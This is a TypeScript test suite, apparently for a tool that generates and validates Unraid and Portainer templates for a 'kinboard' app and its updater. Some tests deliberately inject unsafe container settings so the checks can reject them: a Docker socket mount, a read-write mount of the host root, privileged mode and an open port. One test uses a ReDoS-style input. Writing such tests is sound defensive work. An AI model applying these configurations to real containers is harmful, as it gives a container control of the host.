    expect(with_(`${src.images.aio}:`, `${src.images.app}:`).join()).toContain("not docker.yml's all-in-one image");
    expect(with_(/ Mask="false"/, "").join()).toMatch(/Config Web UI lacks Mask/);
    expect(with_(/Display="always"/, 'Display="sometimes"').join()).toContain('Display="sometimes" is not one of');
    expect(with_(/Target="PUID" Default="99"/, 'Target="PUID" Default="1000"').join()).toContain("PUID/PGID must default to Unraid's 99:100");
    expect(with_(/<TemplateURL>[^<]+</, "<TemplateURL>https://example.com/t.xml<").join()).toContain("TemplateURL is not the template repository's raw URL");
    expect(with_(/<Overview>/, "<Overview>Shortened. ").join()).toBe("");
    expect(with_(/go2rtc is not included/, "go2rtc is included").join()).toContain("lacks the all-in-one note");
    expect(listingProblems({ ...files, "unraid/ca_profile.xml": files["unraid/ca_profile.xml"].replace(/<Profile>[^<]+<\/Profile>/, "<Profile> </Profile>") }, src))
      .toContain("unraid: ca_profile.xml has no Profile (CA requires a non-empty one)");
    const pt = JSON.parse(files["portainer/templates.json"]);
    pt.templates.find((t: { type: number }) => t.type === 1).image = `${src.images.app}:next`;
    expect(listingProblems({ ...files, "portainer/templates.json": JSON.stringify(pt) }, src).join()).toContain("portainer: runs");
  });

  test("the channel comes from docker.yml: once AIO_IMAGE_TAGS publishes `latest`, the template follows, with `next` as a Branch", async () => {
    const root = inputsCopy();
    try {
      const { loadSources } = await sourcesMod;
      const { buildListings } = await buildMod;
      const { listingProblems } = await checksMod;
      const wf = join(root, ".github/workflows/docker.yml");
      const text = readFileSync(wf, "utf8");
      const stable = "    type=raw,value=latest,enable=${{ startsWith(github.ref, 'refs/tags/v') && !contains(github.ref, '-') }}\n";
      const at = text.indexOf("  AIO_IMAGE_TAGS: |\n") + "  AIO_IMAGE_TAGS: |\n".length;
      writeFileSync(wf, text.slice(0, at) + stable + text.slice(at));
      const src = loadSources(root);
      expect(src.channels.aio).toEqual({ stable: "latest", next: "next" });
      const files = buildListings(src);
      const xml = files[tpl(src.meta.slug)];
      expect(xml).toContain(`<Repository>${src.images.aio}:latest</Repository>`);
      expect(xml).not.toContain("<Beta>");
      expect(xml).toMatch(/<Branch>\s*<Tag>next<\/Tag>/);
      expect(listingProblems(files, src)).toEqual([]);
      // and the committed template, still on `next`, now fails the checks.
      const { filesOnDisk } = await buildMod;
      expect(listingProblems(filesOnDisk(REPO), src).join()).toContain("docker.yml's stable channel is latest");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("the updater's template (RFC-024 §4.7): the socket and its own folder, nothing else; the all-in-one container it looks after named as Unraid names it", async () => {
    const { src, files } = await generated();
    const xml = files[`unraid/templates/${src.meta.slug}-updater.xml`];
    const tag = src.channels.aio.stable ?? src.channels.aio.next;
    expect(xml).toContain('<Container version="2">');
    expect(xml).toContain(`<Repository>${src.images.updater}:${tag}</Repository>`);
    expect(xml).toContain("<ExtraParams>--entrypoint=kinboard-updater</ExtraParams>");
    expect(xml).toMatch(/<Config [^>]*Target="\/var\/run\/docker\.sock" Default="\/var\/run\/docker\.sock" Mode="rw"[^>]*Type="Path"/);
    expect(xml).toMatch(new RegExp(`<Config [^>]*Target="/kinboard" Default="/mnt/user/appdata/${src.meta.slug}-updater" Mode="rw"[^>]*Type="Path"`));
    expect(xml).toMatch(new RegExp(`<Config [^>]*Target="KINBOARD_AIO_CONTAINER" Default="${src.meta.name}"`));
    expect(xml).not.toContain('Type="Port"');
    // The socket is the updater's alone.
    expect(files[`unraid/templates/${src.meta.slug}.xml`]).not.toContain("docker.sock");
    expect(files["unraid/README.md"]).toContain(`templates/${src.meta.slug}-updater.xml`);
  });

  test("red: the updater template's rules and the socket rule, broken on purpose", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const upd = `unraid/templates/${src.meta.slug}-updater.xml`;
    const aio = `unraid/templates/${src.meta.slug}.xml`;
    const edit = (path: string, from: string | RegExp, to: string) => {
      const changed = files[path].replace(from, to);
      expect(changed, String(from)).not.toBe(files[path]);
      return listingProblems({ ...files, [path]: changed }, src).join("\n");
    };
    expect(edit(aio, "</Container>", '  <Config Name="Docker" Target="/var/run/docker.sock" Default="/var/run/docker.sock" Mode="rw" Description="x" Type="Path" Display="always" Required="false" Mask="false">/var/run/docker.sock</Config>\n</Container>'))
      .toContain("the all-in-one template must never get the Docker socket");
    expect(edit(upd, "--entrypoint=kinboard-updater", "--entrypoint=webhook")).toContain("ExtraParams must be exactly --entrypoint=kinboard-updater");
    expect(edit(upd, `${src.images.updater}:`, `${src.images.app}:`)).toContain("not docker.yml's");
    expect(edit(upd, "</Container>", '  <Config Name="Root" Target="/host" Default="/" Mode="rw" Description="x" Type="Path" Display="always" Required="false" Mask="false">/</Config>\n</Container>'))
      .toContain("its paths must be exactly the Docker socket and its own folder");
    expect(edit(upd, "</Container>", '  <Config Name="Web" Target="9000" Default="9000" Mode="tcp" Description="x" Type="Port" Display="always" Required="false" Mask="false">9000</Config>\n</Container>'))
      .toContain("the updater opens no port");
    expect(edit(upd, new RegExp(`Default="${src.meta.name}"([^>]*)>${src.meta.name}<`), 'Default="kinboard"$1>kinboard<')).toContain("KINBOARD_AIO_CONTAINER must default to the all-in-one template's Name");
    expect(edit(upd, "<Privileged>false</Privileged>", "<Privileged>true</Privileged>")).toContain("Privileged must be false");
    const { [upd]: _gone, ...without } = files;
    expect(listingProblems(without, src).join()).toContain("(the updater's template) is missing");
  });

  test("the CA category check is linear and still strict", async () => {
    const { metadataProblems, loadSources } = await sourcesMod;
    const meta = structuredClone(loadSources(REPO).meta);
    const bad = (category: string) => { meta.aio.unraid.category = category; return metadataProblems(meta).join(); };
    expect(bad("HomeAutomation: Productivity:")).toBe("");
    expect(bad("HomeAutomation Productivity")).toContain("aio.unraid.category");
    expect(bad("Home:Automation: x")).toContain("aio.unraid.category");
    // CodeQL's input: "A:" then many "AA:", ending in a non-match. Instant, not exponential.
    const t0 = Date.now();
    expect(bad(`A:${"AA:".repeat(5000)}!`)).toContain("aio.unraid.category");
    expect(Date.now() - t0).toBeLessThan(200);
  });

  test("the image name comes from docker.yml: renamed there, the template follows", async () => {
    const root = inputsCopy();
    try {
      const { loadSources } = await sourcesMod;
      const { buildListings } = await buildMod;
      const wf = join(root, ".github/workflows/docker.yml");
      writeFileSync(wf, readFileSync(wf, "utf8").replace(/^(\s+AIO_IMAGE_NAME: \$\{\{ github\.repository_owner \}\})\/[a-z-]+$/m, "$1/one-box"));
      const src = loadSources(root);
      expect(src.images.aio).toMatch(/\/one-box$/);
      expect(buildListings(src)[tpl(src.meta.slug)]).toContain(`<Repository>${src.images.aio}:next</Repository>`);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
